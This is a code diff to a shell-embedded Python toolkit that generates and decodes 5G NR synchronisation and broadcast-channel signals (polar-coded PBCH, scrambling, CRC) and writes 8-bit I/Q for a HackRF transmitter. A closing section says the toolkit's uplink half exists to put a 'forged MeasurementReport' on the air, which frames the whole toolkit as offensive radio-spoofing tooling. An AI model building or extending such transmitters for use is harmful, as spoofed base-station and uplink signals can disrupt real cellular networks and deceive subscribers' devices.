+    and rate matching to E = 864 (7.1.5)."""
+    a = payload_scramble(payload_generate(mib, sfn, hrf, l_max, kssb_msb,
+                                          ssb_idx), sfn, l_max, ncellid)
+    bits = a + crc24c(a)
+    if len(bits) != 56:
+        raise SystemExit("ERROR\tthe BCH transport block is %d bits, 7.1.3 "
+                         "says 56" % len(bits))
+    return rate_match(polar_encode(bits, 512), 864, 56)
+
+
+def pbch_coded_scramble(f, ncellid, i_ssb, l_max):
+    """TS 38.211 7.3.3.1: b~(i) = (b(i) + c(i + nu*M_bit)) mod 2 with
+    M_bit = 864, c_init = N_ID^cell and nu the two (L_max = 4) or three
+    (L_max > 4) least significant bits of the candidate SS/PBCH block index."""
+    nu = i_ssb & (3 if l_max <= 4 else 7)
+    c = gold(ncellid, nu * 864 + 864)
+    return [f[i] ^ int(c[i + nu * 864]) for i in range(len(f))]
+
+
+def bch_pin_check():
+    """Recompute the chain for the pinned vector and compare with the codeword
+    and the scrambled codeword an independent implementation produced. A chain
+    that agrees only with itself is what a wrong chain does, so this refuses to
+    let the generator emit a waveform at all."""
+    mib = mib_payload(BCH_PINNED["sfn"])
+    cw = bch_encode(mib, BCH_PINNED["sfn"], BCH_PINNED["hrf"],
+                    BCH_PINNED["l_max"], BCH_PINNED["kssb_msb"],
+                    BCH_PINNED["i_ssb"], BCH_PINNED["pci"])
+    scr = pbch_coded_scramble(cw, BCH_PINNED["pci"], BCH_PINNED["i_ssb"],
+                              BCH_PINNED["l_max"])
+    CHECKS["bch"] = (864, bits_to_hex(cw) == BCH_PINNED["codeword"])
+    CHECKS["bch_scrambled"] = (864, bits_to_hex(scr) == BCH_PINNED["scrambled"])
+    if not CHECKS["bch"][1]:
+        raise SystemExit("ERROR\tthe BCH chain does not reproduce the pinned "
+                         "TS 38.212 7.1 codeword")
+    if not CHECKS["bch_scrambled"][1]:
+        raise SystemExit("ERROR\tthe TS 38.211 7.3.3.1 scrambling does not "
+                         "reproduce the pinned codeword")
+    return True
+
+
+def mib_payload(sfn):
+    """TS 38.331 6.2.2 MIB -> the 24-bit BCCH-BCH-Message transport block: the
+    1-bit BCCH-BCH-MessageType CHOICE index (0 = mib) followed by the 23 ASN.1
+    MIB bits in field order — systemFrameNumber (6),
     subCarrierSpacingCommon (1), ssb-SubcarrierOffset (4), dmrs-TypeA-Position
     (1), pdcch-ConfigSIB1 (8), cellBarred (1), intraFreqReselection (1),
-    spare (1). The polar code and the 8-bit PBCH payload extension of 38.212
-    7.1.1 are still not implemented, and the TSV says so rather than implying
-    otherwise."""
+    spare (1). systemFrameNumber is the SIX MSBs of the SFN (38.212 7.1.1
+    puts the four LSBs in the PBCH payload, not in the MIB), so sfn is the full
+    10-bit SFN and `sfn >> 4` is what lands in the MIB."""
     b = [0]                                           # ...MessageType = mib
-    b += [(sf >> i) & 1 for i in range(5, -1, -1)]   # systemFrameNumber 6
+    b += [((sfn >> 4) >> i) & 1 for i in range(5, -1, -1)]  # SFN's six MSBs
     b += [0]                                          # subCarrierSpacingCommon
     b += [0, 0, 0, 0]                                 # ssb-SubcarrierOffset 4
     b += [0]                                          # dmrs-TypeA-Position
@@ -1110,7 +1561,7 @@ def ssb_symbols_in_slot(scs):
     return [4]
 
 
-def build_grid(pci, scs, nfft, mib_bits, i_ssb):
+def build_grid(pci, scs, nfft, mib_bits, i_ssb, sfn, hrf, l_max, kssb_msb):
     """The four SSB symbols as four 240-long frequency-domain blocks."""
     nid1, nid2 = pci // 3, pci % 3
     pss = pss_recursive(nid2)
@@ -1140,7 +1591,6 @@ def build_grid(pci, scs, nfft, mib_bits, i_ssb):
     dmrs_k = {1: list(range(v, 240, 4)),
               2: list(range(v, 48, 4)) + list(range(192 + v, 240, 4)),
               3: list(range(v, 240, 4))}
-    pbch_k = [k for k in range(240) if k % 4 != v]
 
     # DMRS: TS 38.211 7.4.1.4.1, c_init = 2^11*(i_SSB+1)*(N_ID^cell//4+1)
     # + 2^6*(i_SSB+1) + N_ID^cell mod 4. Only i_SSB = 0 is emitted here.
@@ -1156,12 +1606,24 @@ def build_grid(pci, scs, nfft, mib_bits, i_ssb):
                              "the pinned TS 38.211 chips (c_init = %d)"
                              % (pci, c_init))
 
-    # PBCH data: the raw MIB + CRC24C as QPSK in the spec's RE order. The
-    # 864-bit polar code and the bit scrambling are NOT built, so only the
-    # first 24 of the 432 PBCH REs are driven and the rest stay empty rather
-    # than carrying bits that would only look like a coded block. The TSV
-    # line pbch_encoding says exactly that.
-    pbch = qpsk(list(mib_bits) + crc24c(mib_bits))
+    # PBCH data: the 864 coded bits of the BCH chain (TS 38.212 7.1), QPSK
+    # modulated after the SS/PBCH block scrambling of TS 38.211 7.3.3.1 and
+    # mapped to the 432 PBCH REs in increasing order of k within each of the
+    # symbols 1, 2 and 3 — TS 38.211 7.4.3.1.3 orders the mapping by k and then
+    # by l, which is the order the DMRS above uses and the order the PBCH RE
+    # indices come back in. The PBCH REs are the DMRS comb's complement.
+    pbch_re = {}
+    for l in (1, 2, 3):
+        band = (range(240) if l in (1, 3)
+                else list(range(48)) + list(range(192, 240)))
+        pbch_re[l] = [k for k in band if k % 4 != v]
+    n_pbch_re = sum(len(pbch_re[l]) for l in pbch_re)
+    coded = bch_encode(mib_bits, sfn, hrf, l_max, kssb_msb, i_ssb, pci)
+    if len(coded) != 864:
+        raise SystemExit("ERROR\tthe BCH chain produced %d bits, 38.212 7.1.5 "
+                         "says 864" % len(coded))
+    f = pbch_coded_scramble(coded, pci, i_ssb, l_max)
+    pbch = qpsk(f)
 
     grids = []
     for l in range(4):
@@ -1178,39 +1640,60 @@ def build_grid(pci, scs, nfft, mib_bits, i_ssb):
             j += 1
     if j != 144:
         raise SystemExit("ERROR\tDMRS occupies %d REs, TS 38.211 says 144" % j)
-    n_pbch_re = sum(len([k for k in (range(240) if s in (1, 3)
-                                      else list(range(48)) + list(range(192, 240)))
-                         if k % 4 != v]) for s in (1, 2, 3))
+    if len(pbch) != n_pbch_re:
+        raise SystemExit("ERROR\t%d PBCH symbols for %d PBCH REs"
+                         % (len(pbch), n_pbch_re))
     CHECKS["dmrs_re"] = (144, j == 144)
     CHECKS["pbch_re"] = (432, n_pbch_re == 432)
-    CHECKS["pbch_driven"] = (len(pbch), len(pbch) <= n_pbch_re)
-    for j, k in enumerate(pbch_k[:len(pbch)]):
-        grids[1][k] = pbch[j]
+    CHECKS["pbch_driven"] = (len(pbch), len(pbch) == n_pbch_re)
+    n = 0
+    for l in (1, 2, 3):
+        for k in pbch_re[l]:
+            grids[l][k] = pbch[n]
+            n += 1
+    if n != 432:
+        raise SystemExit("ERROR\t%d of 432 PBCH REs were driven" % n)
     return grids
 
 
 def main():
     if len(sys.argv) < 6:
         sys.stderr.write("ERROR\tusage: nr_ssb_bb.py <out.c16> <pci> <scs_khz> "
-                         "<nfft> <sf> [--slot N] [--detail FILE]\n")
+                         "<nfft> <sf> [--slot N] [--detail FILE] [--i8 FILE]\n")
         return 2
     out, pci, scs, nfft, sf = (sys.argv[1], int(sys.argv[2]), int(sys.argv[3]),
                                int(sys.argv[4]), int(sys.argv[5]))
     detail = None
     if "--detail" in sys.argv:
         detail = sys.argv[sys.argv.index("--detail") + 1]
+    # --i8 writes the same waveform as 8-bit signed I/Q, which is the format a
+    # driver's own CLI may read (hackrf_transfer). It is a rounding of the
+    # identical array, not a second modulation.
+    i8 = sys.argv[sys.argv.index("--i8") + 1] if "--i8" in sys.argv else None
     nslot = int(sys.argv[sys.argv.index("--slot") + 1]) if "--slot" in sys.argv else 0
-    if scs not in NFFT_STD:
-        sys.stderr.write("ERROR\tSCS %d kHz has no numerology in TS 38.104 "
-                         "5.3.1\n" % scs)
+    if scs not in SCS_SUPPORTED:
+        sys.stderr.write("ERROR\tSCS %d kHz has no numerology in TS 38.211 "
+                         "4.2\n" % scs)
         return 2
     mu = {15: 0, 30: 1, 60: 2, 120: 3, 240: 4}[scs]
     if not 0 <= nslot < 2 ** mu:
         sys.stderr.write("ERROR\tslot %d is outside subframe mu=%d (0..%d)\n"
                          % (nslot, mu, 2 ** mu - 1))
         return 2
+    if not 0 <= sf <= 1023:
+        sys.stderr.write("ERROR\tSFN %d does not fit the 10 bits the PBCH "
+                         "carries (38.212 7.1.1)\n" % sf)
+        return 2
     fs = scs * 1000 * nfft
-    grids = build_grid(pci, scs, nfft, mib_payload(pci, sf), 0)
+    # L_max (TS 38.213 4.1) selects which 7.1.1 branch fills a_{A+5}..a_{A+7}:
+    # 4 or 8 in FR1, 64 for the FR2 SSB cases D and E. It is derived from the
+    # numerology rather than assumed. Only i_SSB = 0 is emitted, so the half
+    # frame bit and the k_SSB MSB are 0 as well.
+    l_max = 64 if scs >= 120 else 8
+    hrf, kssb_msb = 0, 0
+    grids = build_grid(pci, scs, nfft, mib_payload(sf), 0, sf, hrf, l_max,
+                       kssb_msb)
+    bch_pin_check()
     # TS 38.213 4.1: the four SSB symbols are consecutive from the candidate
     # start symbol (Case A: 2, Case B/C/D: 4) — not one every four symbols.
     syms_in_slot = [ssb_symbols_in_slot(scs)[0] + k for k in range(4)]
@@ -1236,6 +1719,13 @@ def main():
     inter[0::2] = i16
     inter[1::2] = q16
     inter.tofile(out)
+    if i8:
+        # 16-bit sample / 256 == 8-bit sample: the same waveform, one rounding
+        # of the same array, so the file a driver reads and the file the
+        # decoder verified cannot disagree about anything but quantisation.
+        v8 = np.clip(np.rint(inter.astype(np.float64) / 256.0),
+                     -128, 127).astype(np.int8)
+        v8.tofile(i8)
 
     if detail:
         with open(detail, "w") as fh:
@@ -1256,6 +1746,37 @@ def main():
     print("dmrs_re\t%d" % CHECKS.get("dmrs_re", (0, False))[0])
     print("pbch_re\t%d" % CHECKS.get("pbch_re", (0, False))[0])
     print("pbch_re_driven\t%d" % CHECKS.get("pbch_driven", (0, False))[0])
+    # The BCH chain's stages, as machine-readable TSV, so an independent
+    # checker can compare each one against the clause instead of against this
+    # file's own constants: the 32-bit interleaved+scrambled payload, the
+    # 56-bit K after CRC24C, the 864-bit rate-matched codeword, and the
+    # codeword after the TS 38.211 7.3.3.1 scrambling.
+    pl = payload_scramble(payload_generate(mib_payload(sf), sf, hrf, l_max,
+                                           kssb_msb, 0), sf, l_max, pci)
+    cw = bch_encode(mib_payload(sf), sf, hrf, l_max, kssb_msb, 0, pci)
+    scr = pbch_coded_scramble(cw, pci, 0, l_max)
+    print("mib_hex\t%s" % bits_to_hex(mib_payload(sf)))
+    print("sfn\t%d" % sf)
+    print("mib_sfn_field\t%d" % (sf >> 4))
+    print("bch_payload_hex\t%s" % bits_to_hex(pl))
+    print("bch_k_hex\t%s" % bits_to_hex(pl + crc24c(pl)))
+    print("bch_codeword_hex\t%s" % bits_to_hex(cw))
+    print("bch_scrambled_hex\t%s" % bits_to_hex(scr))
+    print("bch_payload_bits\t32")
+    print("bch_k_bits\t56")
+    print("bch_codeword_bits\t864")
+    print("generator_version\t%s" % GEN_VERSION)
+    print("bch_l_max\t%d" % l_max)
+    print("bch_hrf\t%d" % hrf)
+    print("bch_kssb_msb\t%d" % kssb_msb)
+    print("bch_i_ssb\t0")
+    print("bch_pinned_checked\t%d" % CHECKS.get("bch", (0, False))[0])
+    print("bch_pinned_agree\t%s" % ("1" if CHECKS.get("bch", (0, False))[1]
+                                    else "0"))
+    print("bch_scrambled_pinned_agree\t%s"
+          % ("1" if CHECKS.get("bch_scrambled", (0, False))[1] else "0"))
+    print("pbch_scramble_nu\t%d" % (0 & (3 if l_max <= 4 else 7)))
+    print("pbch_scramble_c_init\t%d" % pci)
     print("pss_derivation\t%s" % PSS_FORM)
     print("sss_derivation\t%s" % SSS_FORM)
     print("fs_hz\t%d" % fs)
@@ -1270,7 +1791,11 @@ def main():
     print("cp_per_slot\t%d" % sum(cps))
     print("ssb_symbols\t%s" % ",".join(str(s) for s in syms_in_slot))
     print("iq_bytes\t%d" % (i16.size * 4))
-    print("pbch_encoding\tmib+crc24c mapped directly (polar code TS 38.212 7.1 NOT implemented)")
+    if i8:
+        print("iq8_file\t%s" % i8)
+        print("iq8_bytes\t%d" % (i16.size * 2))
+    print("pbch_encoding\tTS 38.212 7.1 (payload, scramble, CRC24C, polar 512, "
+          "rate match to 864) + TS 38.211 7.3.3.1 coded bit scrambling")
     return 0
 
 
@@ -1467,22 +1992,245 @@ def spec_pbch_re(v, s):
 
 def crc24c_bits(bits):
     """TS 38.212 5.1 gCRC24C = D^24+D^23+D^21+D^20+D^17+D^15+D^13+D^12+D^8
-    +D^4+D^2+D+1 over a decoded block, register preset to all ones, check bits
-    appended MSB-first. The polynomial is written as its exponent set and then
-    checked against the constant, because the neighbouring gCRC24A
-    (0x864CFB) differs and a wrong one still produces plausible-looking bits."""
+    +D^4+D^2+D+1 over a decoded block. The polynomial is written as its
+    exponent set and then checked against the constant, because the
+    neighbouring gCRC24A (0x864CFB) differs and a wrong one still produces
+    plausible-looking bits. The register starts at ZERO and only the message
+    bits are shifted in: that is the remainder 38.212 5.1 defines, and it is
+    deliberately written here again rather than shared with the generator, so
+    that the two ends cannot agree on the same mistake."""
     poly = 0
     for e in (24, 23, 21, 20, 17, 15, 13, 12, 8, 4, 2, 1, 0):
         poly |= 1 << e
     if poly != 0x1B2B117:
         raise SystemExit("ERROR\tgCRC24C exponent set does not build 0x1B2B117")
-    reg = 0xFFFFFF
-    for b in list(bits) + [0] * 24:
+    reg = 0
+    for b in bits:
         msb = (reg >> 23) & 1
         reg = (reg << 1) & 0xFFFFFF
         if msb ^ (b & 1):
             reg ^= poly
     return [(reg >> (23 - i)) & 1 for i in range(24)]
+
+
+# ── The BCH chain (TS 38.212 7.1) decoded, not assumed ─────────────────────
+# The tables are the specification's (TS 38.212 Tables 5.3.1.2-1, 5.3.1.1-1 and
+# 7.1.1-1), repeated here on purpose: this decoder is a second implementation,
+# and a table shared with the generator would turn one misreading of it into
+# apparent agreement between the two ends.
+POLAR_Q512 = [
+    0, 1, 2, 4, 8, 16, 32, 3, 5, 64, 9, 6, 17, 10, 18, 128,
+    12, 33, 65, 20, 256, 34, 24, 36, 7, 129, 66, 11, 40, 68, 130, 19,
+    13, 48, 14, 72, 257, 21, 132, 35, 258, 26, 80, 37, 25, 22, 136, 260,
+    264, 38, 96, 67, 41, 144, 28, 69, 42, 49, 74, 272, 160, 288, 192, 70,
+    44, 131, 81, 50, 73, 15, 320, 133, 52, 23, 134, 384, 76, 137, 82, 56,
+    27, 97, 39, 259, 84, 138, 145, 261, 29, 43, 98, 88, 140, 30, 146, 71,
+    262, 265, 161, 45, 100, 51, 148, 46, 75, 266, 273, 104, 162, 53, 193, 152,
+    77, 164, 268, 274, 54, 83, 57, 112, 135, 78, 289, 194, 85, 276, 58, 168,
+    139, 99, 86, 60, 280, 89, 290, 196, 141, 101, 147, 176, 142, 321, 31, 200,
+    90, 292, 322, 263, 149, 102, 105, 304, 296, 163, 92, 47, 267, 385, 324, 208,
+    386, 150, 153, 165, 106, 55, 328, 113, 154, 79, 269, 108, 224, 166, 195, 270,
+    275, 291, 59, 169, 114, 277, 156, 87, 197, 116, 170, 61, 281, 278, 177, 293,
+    388, 91, 198, 172, 120, 201, 336, 62, 282, 143, 103, 178, 294, 93, 202, 323,
+    392, 297, 107, 180, 151, 209, 284, 94, 204, 298, 400, 352, 325, 155, 210, 305,
+    300, 109, 184, 115, 167, 225, 326, 306, 157, 329, 110, 117, 212, 171, 330, 226,
+    387, 308, 216, 416, 271, 279, 158, 337, 118, 332, 389, 173, 121, 199, 179, 228,
+    338, 312, 390, 174, 393, 283, 122, 448, 353, 203, 63, 340, 394, 181, 295, 285,
+    232, 124, 205, 182, 286, 299, 354, 211, 401, 185, 396, 344, 240, 206, 95, 327,
+    402, 356, 307, 301, 417, 213, 186, 404, 227, 418, 302, 360, 111, 331, 214, 309,
+    188, 449, 217, 408, 229, 159, 420, 310, 333, 119, 339, 218, 368, 230, 391, 313,
+    450, 334, 233, 175, 123, 341, 220, 314, 424, 395, 355, 287, 183, 234, 125, 342,
+    316, 241, 345, 452, 397, 403, 207, 432, 357, 187, 236, 126, 242, 398, 346, 456,
+    358, 405, 303, 244, 189, 361, 215, 348, 419, 406, 464, 362, 409, 219, 311, 421,
+    410, 231, 248, 369, 190, 364, 335, 480, 315, 221, 370, 422, 425, 451, 235, 412,
+    343, 372, 317, 222, 426, 453, 237, 433, 347, 243, 454, 318, 376, 428, 238, 359,
+    457, 399, 434, 349, 245, 458, 363, 127, 191, 407, 436, 465, 246, 350, 460, 249,
+    411, 365, 440, 374, 423, 466, 250, 371, 481, 413, 366, 468, 429, 252, 373, 482,
+    427, 414, 223, 472, 455, 377, 435, 319, 484, 430, 488, 239, 378, 459, 437, 380,
+    461, 496, 351, 467, 438, 251, 462, 442, 441, 469, 247, 367, 253, 375, 444, 470,
+    483, 415, 485, 473, 474, 254, 379, 431, 489, 486, 476, 439, 490, 463, 381, 497,
+    492, 443, 382, 498, 445, 471, 500, 446, 475, 487, 504, 255, 477, 491, 478, 383,
+    493, 499, 502, 494, 501, 447, 505, 506, 479, 508, 495, 503, 507, 509, 510, 511,
+]
+POLAR_IL_MAX = [
+    0, 2, 4, 7, 9, 14, 19, 20, 24, 25, 26, 28, 31, 34, 42, 45, 49, 50, 51, 53,
+    54, 56, 58, 59, 61, 62, 65, 66, 67, 69, 70, 71, 72, 76, 77, 81, 82, 83, 87, 88,
+    89, 91, 93, 95, 98, 101, 104, 106, 108, 110, 111, 113, 115, 118, 119, 120, 122, 123, 126, 127,
+    129, 132, 134, 138, 139, 140, 1, 3, 5, 8, 10, 15, 21, 27, 29, 32, 35, 43, 46, 52,
+    55, 57, 60, 63, 68, 73, 78, 84, 90, 92, 94, 96, 99, 102, 105, 107, 109, 112, 114, 116,
+    121, 124, 128, 130, 133, 135, 141, 6, 11, 16, 22, 30, 33, 36, 44, 47, 64, 74, 79, 85,
+    97, 100, 103, 117, 125, 131, 136, 142, 12, 17, 23, 37, 48, 75, 80, 86, 137, 143, 13, 18,
+    38, 144, 39, 145, 40, 146, 41, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159,
+    160, 161, 162, 163,
+]
+PBCH_G = [16, 23, 18, 17, 8, 30, 10, 6, 24, 7, 0, 5, 3, 2, 1, 4,
+          9, 11, 12, 13, 14, 15, 19, 20, 21, 22, 25, 26, 27, 28, 29, 31]
+# Table 5.4.1.1-1: the sub-block interleaver pattern P(i), needed to undo
+# 5.4.1.1 before inverting the polar transform.
+P_SUBBLOCK = [0, 1, 2, 4, 3, 5, 6, 7, 8, 16, 9, 17, 10, 18, 11, 19,
+              12, 20, 13, 21, 14, 22, 15, 23, 24, 25, 26, 28, 27, 29, 30, 31]
+# The same stale-copy caveat as the generator's marker: this file is written by
+# nair_write_bb_dec, which only runs on the transmit path.
+DEC_VERSION = "nair-ssb-dec/3 (BCH inverse 38.211 7.3.3.1 + 38.212 7.1)"
+
+
+def gold(c_init, length):
+    """TS 38.211 5.2.1, Nc = 1600, written out again rather than imported."""
+    nc = 1600
+    x1 = [0] * (nc + length + 31)
+    x2 = [0] * (nc + length + 31)
+    x1[0] = 1
+    for i in range(31):
+        x2[i] = (c_init >> i) & 1
+    for n in range(nc + length):
+        x1[n + 31] = (x1[n + 3] + x1[n]) % 2
+        x2[n + 31] = (x2[n + 3] + x2[n + 2] + x2[n + 1] + x2[n]) % 2
+    return [(x1[n + nc] + x2[n + nc]) % 2 for n in range(length)]
+
+
+def polar_info_positions(k, n):
+    """TS 38.212 5.3.1.2 with 5.4.1.1: with E >= N there is no puncturing and
+    no shortening, so Q_I^N is the k most reliable indices below N."""
+    qn = [q for q in POLAR_Q512 if q < n]
+    if k > len(qn):
+        raise SystemExit("ERROR\tpolar code K = %d does not fit N = %d" % (k, n))
+    return sorted(qn[len(qn) - k:])
+
+
+def polar_frozen_mask(n, k):
+    """True where the bit is frozen (TS 38.212 5.3.1.2/5.4.1.1)."""
+    info = set(polar_info_positions(k, n))
+    return [i not in info for i in range(n)]
+
+
+def polar_deinterleave(cp, k):
+    """Inverse of 5.3.1.1 with I_IL = 1: c'_k = c_Pi(k), so c_Pi(k) = c'_k."""
+    off = 164 - k
+    order = [POLAR_IL_MAX[m] - off for m in range(164) if POLAR_IL_MAX[m] >= off]
+    c = [0] * k
+    for idx, target in enumerate(order):
+        c[target] = cp[idx]
+    return c
+
+
+def polar_inverse(d, frozen):
+    """Invert the polar transform of TS 38.212 5.3.1.2 exactly. Over GF(2)
+    G_N = G_2^{kron n} with G_2 = [[1,0],[1,1]], and G_2 is its own inverse, so
+    G_N is an involution: the same n-stage butterfly that encodes also
+    decodes. That holds because the waveform being checked is noiseless — a
+    receiver would run soft successive cancellation — and it is stronger than
+    a min-sum approximation, which makes wrong decisions whenever its f or g
+    lands on a tie. The frozen positions are returned as a count rather than
+    assumed: a codeword with a nonzero frozen bit is not a codeword."""
+    u = list(d)
+    n = len(u)
+    half = 1
+    while half < n:
+        step = half << 1
+        for i in range(0, n, step):
+            for j in range(i, i + half):
+                u[j] ^= u[j + half]
+        half = step
+    frozen_errors = sum(1 for i in range(n) if frozen[i] and u[i])
+    return u, frozen_errors
+
+
+def rate_recover(e, n):
+    """Inverse of the 5.4.1.2 bit selection when E >= N: e_k = y_mod(k,N), so
+    the first N bits of e are the sub-block interleaver's output y."""
+    if len(e) < n:
+        return None
+    return e[:n]
+
+
+def subblock_deinterleave(y):
+    """Inverse of TS 38.212 5.4.1.1: y_n = d_J(n), so d_J(n) = y_n.
+    Recovering only e[:N] is not enough — y is the polar encoder's output
+    through this interleaver, and skipping this step leaves the decoder
+    inverse-transforming an interleaved codeword."""
+    n = len(y)
+    if n % 32:
+        raise SystemExit("ERROR\tthe polar code length %d is not 32 sub-blocks"
+                         % n)
+    d = [0] * n
+    for k in range(n):
+        i = (32 * k) // n
+        d[P_SUBBLOCK[i] * (n // 32) + (k % (n // 32))] = y[k]
+    return d
+
+
+def payload_descramble(a, l_max, ncellid):
+    """TS 38.212 7.1.2. The 2nd and 3rd SFN LSBs, the half frame bit and the
+    SS/PBCH block index bits are never scrambled, which is what lets a receiver
+    read v out of the received block before descrambling the rest."""
+    m = {4: 29, 8: 29, 10: 28, 20: 27, 64: 26}[l_max]
+    v = 2 * a[PBCH_G[7]] + a[PBCH_G[8]]
+    excl = {PBCH_G[7], PBCH_G[8], PBCH_G[10]}
+    if l_max == 10:
+        excl.add(PBCH_G[13])
+    elif l_max == 20:
+        excl |= {PBCH_G[12], PBCH_G[13]}
+    elif l_max == 64:
+        excl |= {PBCH_G[11], PBCH_G[12], PBCH_G[13]}
+    c = gold(ncellid, (v + 1) * m)
+    out = list(a)
+    j = 0
+    for i in range(32):
+        if i in excl:
+            continue
+        out[i] = a[i] ^ int(c[j + v * m])
+        j += 1
+    return out, v
+
+
+def payload_deinterleave(a):
+    """TS 38.212 7.1.1 read backwards: the MIB's six SFN bits, the SFN's four
+    LSBs, the half frame bit, the k_SSB MSB and the rest of the MIB."""
+    mib = [0] * 24
+    for k in range(6):
+        mib[1 + k] = a[PBCH_G[k]]
+    j = 14
+    for i in range(24):
+        if 1 <= i <= 6:
+            continue
+        mib[i] = a[PBCH_G[j]]
+        j += 1
+    field = 0
+    for k in range(6):
+        field = (field << 1) | mib[1 + k]
+    sfn = ((field << 4) | (a[PBCH_G[6]] << 3) | (a[PBCH_G[7]] << 2) |
+           (a[PBCH_G[8]] << 1) | a[PBCH_G[9]])
+    return mib, sfn, a[PBCH_G[10]], a[PBCH_G[11]]
+
+
+def bch_decode(coded, pci, l_max):
+    """Invert TS 38.211 7.3.3.1 and then TS 38.212 7.1.5, 7.1.4, 7.1.3, 7.1.2
+    and 7.1.1. nu (the candidate SS/PBCH block index LSBs) is not carried
+    anywhere the receiver can read before descrambling, so every value the
+    numerology allows is tried and the one whose CRC24C checks is kept."""
+    out = {"decode_ok": 0, "attempts": 0}
+    for nu in range(4 if l_max <= 4 else 8):
+        out["attempts"] += 1
+        c = gold(pci, nu * 864 + 864)
+        descr = [coded[i] ^ int(c[i + nu * 864]) for i in range(864)]
+        y = rate_recover(descr, 512)
+        if y is None:
+            continue
+        u, frozen_errors = polar_inverse(subblock_deinterleave(y),
+                                         polar_frozen_mask(512, 56))
+        if frozen_errors:
+            continue
+        bits = polar_deinterleave([u[i] for i in polar_info_positions(56, 512)],
+                                  56)
+        if crc24c_bits(bits[:32]) != bits[32:]:
+            continue
+        a, v = payload_descramble(bits[:32], l_max, pci)
+        mib, sfn, hrf, kssb_msb = payload_deinterleave(a)
+        out.update({"decode_ok": 1, "nu": nu, "v": v, "mib": mib, "sfn": sfn,
+                    "hrf": hrf, "kssb_msb": kssb_msb, "payload": bits[:32],
+                    "k": bits})
+        return out
+    return out
 
 
 def main():
@@ -1699,38 +2447,681 @@ def main():
             print("dmrs_pinned_checked\t0")
             print("dmrs_pinned_agree\tn/a")
 
-        # 5. The PBCH block: the raw payload in the spec's RE order, so the
-        # decoder can demodulate it and recompute its CRC24C.
-        pb = spec_pbch_re(v, 1)
-        n_used = min(24, len(pb))
-        bits = []
-        for k in pb[:n_used]:
-            c = ssb[1][k]
-            bits += [0 if c.real > 0 else 1, 0 if c.imag > 0 else 1]
-        if len(bits) >= 48:
-            mib, crc = bits[:24], bits[24:48]
-            print("pbch_bits_used\t%d" % len(bits))
-            print("mib_hex\t%s" % "".join("%x" % int("".join(
-                str(x) for x in mib[i:i + 4]), 2) for i in range(0, 24, 4)))
-            print("mib_sfn\t%d" % int("".join(str(x) for x in mib[1:7]), 2))
-            print("mib_message_type\t%d" % mib[0])
-            print("pbch_crc24c_ok\t%d" % (1 if crc24c_bits(mib) == crc else 0))
+        # 5. The PBCH block: the 864 coded bits of the BCH chain demodulated
+        # from the 432 PBCH REs, then inverted through TS 38.211 7.3.3.1 and
+        # TS 38.212 7.1. The MIB and the SFN come OUT OF THE CODEWORD: the
+        # coded bits are rate matched, polar coded, scrambled and interleaved,
+        # so a decoder that read "the MIB" from any fixed RE would be reading
+        # its own generator's layout instead of the specification's.
+        coded = []
+        for s in (1, 2, 3):
+            for k in spec_pbch_re(v, s):
+                c = ssb[s][k]
+                coded += [0 if c.real > 0 else 1, 0 if c.imag > 0 else 1]
+        # L_max selects nu's width in TS 38.211 7.3.3.1 and the 7.1.1 payload
+        # branch: 4 or 8 in FR1, 64 for the FR2 SSB cases D/E.
+        l_max_dec = 64 if scs >= 120 else 8
+        print("pbch_bits_used\t%d" % len(coded))
+        res = bch_decode(coded, pci, l_max_dec)
+        print("bch_decode_ok\t%d" % res["decode_ok"])
+        print("bch_nu_attempts\t%d" % res["attempts"])
+        if res["decode_ok"]:
+            print("bch_i_ssb\t%d" % res["nu"])
+            print("bch_descramble_v\t%d" % res["v"])
+            print("mib_hex\t%s" % "".join(
+                "%x" % int("".join(str(x) for x in res["mib"][i:i + 4]), 2)
+                for i in range(0, 24, 4)))
+            print("mib_sfn\t%d" % res["sfn"])
+            print("mib_sfn_field\t%d" % (res["sfn"] >> 4))
+            print("mib_message_type\t%d" % res["mib"][0])
+            print("pbch_crc24c_ok\t1")
+            print("bch_payload_hex\t%s" % "".join(
+                "%x" % int("".join(str(x) for x in res["payload"][i:i + 4]), 2)
+                for i in range(0, 32, 4)))
         else:
-            print("pbch_bits_used\t%d" % len(bits))
             print("pbch_crc24c_ok\t0")
-
     if grid_out:
         with open(grid_out, "w") as fh:
             for l, b in enumerate(block):
                 fh.write("%d\t%s\n" % (l, " ".join(
                     "%.6f:%.6f" % (x.real, x.imag) for x in b)))
     print("scs_khz\t%d" % scs)
+    print("decoder_version\t%s" % DEC_VERSION)
     return 0
 
 
 if __name__ == "__main__":
     sys.exit(main())
 NAIR_PYEOF
+}
+
+# ── uplink baseband — the forged report on the air ──────────────────────
+# O17's deliverable is a forged MeasurementReport, and a report is an UPLINK
+# message: a receiver-only module could build the PDU but could never put it
+# on the air. This is that half. What it builds is a real CP-OFDM PUSCH slot
+# per TS 38.211 §6.4.1 — the demodulation reference signal of §6.4.1.1.1 on
+# the subcarriers that section names, the UL-SCH bits QPSK-mapped over the
+# rest, and the §5.3.1 cyclic prefixes the downlink path uses too.
+#
+# What is NOT implemented is printed rather than implied: the LDPC chain and
+# rate matching of §7.2, the UL-SCH CRC, and the data scrambling of §6.3.1.1.
+# A QPSK mapping of the PDU bits is honest about being a QPSK mapping of the
+# PDU bits, and the three checks that ARE real — the DMRS sequence, the CP
+# geometry, and the PDU read back out of the waveform — are the ones that
+# would catch a forgery that never left the keyboard.
+nair_write_ul_gen() {
+    mkdir -p "$MOD_TMP" 2>/dev/null
+    cat > "$NAIR_UL_PY" <<'NAIR_PYEOF'
+#!/usr/bin/env python3
+"""NR PUSCH (uplink) baseband generator — TS 38.211 6.4.1, 5.3.1, 7.4.1.1.1.
+
+One slot of CP-OFDM carrying a PUSCH: the demodulation reference signal of
+6.4.1.1.1 on DMRS configuration type 1 (every second subcarrier), and the
+UL-SCH transport block QPSK-mapped onto the remaining resource elements.
+
+Deliberately absent, and named in the output rather than implied away: the
+LDPC chain and rate matching of 38.212 7.2, the UL-SCH CRC, and the bit
+scrambling of 38.211 6.3.1.1.
+
+CLI: nr_ul_gen.py <out.c16> <ulsch_hex> <scid> <scs_khz> <nfft>
+                   <n_rb_carrier> <rb_start> <n_rb_alloc>
+                   [--i8 FILE] [--detail FILE]
+"""
+import sys
+
+import numpy as np
+
+# TS 38.211 6.4.1.1.1 with n_scid = 0 and N_ID^SCID = scrambling id. The same
+# c_init form as the PDSCH DMRS, which is what makes the sequence checkable
+# against an independent implementation of the Gold generator (38.211 5.2.1).
+# Each entry is the first 8 QPSK chips as interleaved sign bits (I then Q,
+# MSB first), taken from that independent implementation, not from this file.
+DMRS_PINNED = {
